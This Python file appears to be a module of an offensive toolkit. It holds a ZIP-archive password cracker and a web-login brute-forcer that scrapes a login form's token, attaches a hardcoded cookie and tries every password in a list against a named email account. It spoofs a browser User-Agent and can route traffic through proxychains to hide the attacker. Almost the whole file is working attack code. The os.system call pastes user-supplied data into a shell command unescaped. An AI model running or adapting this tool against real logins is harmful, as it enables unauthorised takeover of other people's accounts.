import json
import os
import sys
from zipfile import ZipFile

import requests
from bs4 import BeautifulSoup

import Setup.setup as setup
import utils.utils as includes


class Bruteforce:

    @staticmethod
    def run():
        run()


def pass_file_input_description():
    """
    Prints information about the password file
    :return: void
    """
    print('Input a password file (leave blanck if you want to use the default file: %s%spasswords.txt' % (
        directory, slash))
    print('\tThe password file will be searched in the %s directory' % directory)
    print(
        '\tIf you want to select it from the current directory or specify a specific path'
        'to the file, add the "-d" argument')
    print('\t\tExample:\n\t\t <pasword file> -d')


def zip_brute_force():
    """
    Zip password Bruteforcer
    :return: void
    """
    try:
        zip_archive = ZipFile(input('Protected archive:'))
        pass_file_input_description()
        pass_file = input("Password file:")
        found = ""
    except Exception:
        print('error')
        sys.exit(0)

    if pass_file == '':
        pass_file = directory + slash + 'passwords.txt'
    elif pass_file != "" and "-d" not in pass_file:
        pass_file = directory + slash + pass_file

    with open(pass_file, "r") as f:
        for line in f:
            password = line.strip("\n")
            password = password.encode("utf-8")

            try:
                found = zip_archive.extractall(pwd=password)
                if not found:
                    print("[+] Password found ", password.decode())
            except RuntimeError:
                pass
        if found == "":
            print("[-] Password not found")


def create_form(headers, url):
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(url, headers=headers)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies


def function(email: str, passw: str, i: int, headers: dict, url: str, proxychains: int) -> bool:
    """
    Sends the data to the login page
    :param 	 	email: 			str
    :param 	 	passw: 			str
    :param 	 	i: 				int
    :param 	 	headers: 		dict
    :param 	 	url: 			str
    :param   	proxychains: 	int
    :return: 	True/False: 	boolean
    """
    global payload, cookie

    payload = dict()
    cookie = dict()
    data = dict()
    if i % 10 == 1:
        payload, cookie = create_form(headers, url)
        payload['email'] = email
    payload['pass'] = passw

    data['payload'] = payload
    data['headers'] = headers
    data['cookie'] = cookie
    data_json = str(json.dumps(data))
    script = "modules%sAttack%sBruteForce%srun.py" % (slash, slash, slash)
    try:
        command_version = includes.get_version()
    except Exception:
        command_version = includes.get_version()[0]
    cmd = "python%s %s -u %s -d '%s'" % (command_version, script, url, data_json)
    if proxychains == 1:
        cmd = "proxychains python%s run.py -u %s -d '%s'" % (command_version, url, data_json)
    result = os.system(cmd)
    if result == 0:
        print("Password found: ", passw)
        return True
    else:
        return False


def run():
    """
    Starts the bruteforce attack
    :return: void
    """
    global slash, directory
    slash = includes.command(setup.commands, 'slash')
    directory = 'data%sBruteForce' % slash

    print('BruteForce for websites\n'
          'Can run with proxychains for linux users, to use the functionality'
          'edit to "On" the value of the proxychains variable in the Setup/setup.py file')
    proxychains = 0
    if os.name != "nt":
        proxychains = includes.check_proxychains(proxychains)

    input_url = str(input('url: '))
    url, name = includes.construct_url(input_url)

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                      '(KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
    }
    # payload = dict()
    # cookie = dict()

    pass_file_input_description()
    pass_file = str(input('password file: '))
    if pass_file == '':
        pass_file = directory + slash + 'passwords.txt'
    elif '-d' in pass_file:
        print("Taking the password file from the spicified path")
    else:
        pass_file = directory + slash + pass_file

    file = open(pass_file, 'r')
    print(pass_file)
    email = input('Email/Username : ')

    print("\nTarget Email ID : ", email)
    print("\nTrying Passwords from list %s ..." % pass_file)

    i = 0
    while file:
        passw = file.readline().strip()
        i += 1
        if len(passw) < 6:
            print("[-] Password must have a minimal lenght of 6.\n Skipping password")
            continue
        print(str(i) + " : ", passw)
        if function(email, passw, i, headers, url, proxychains):
            break
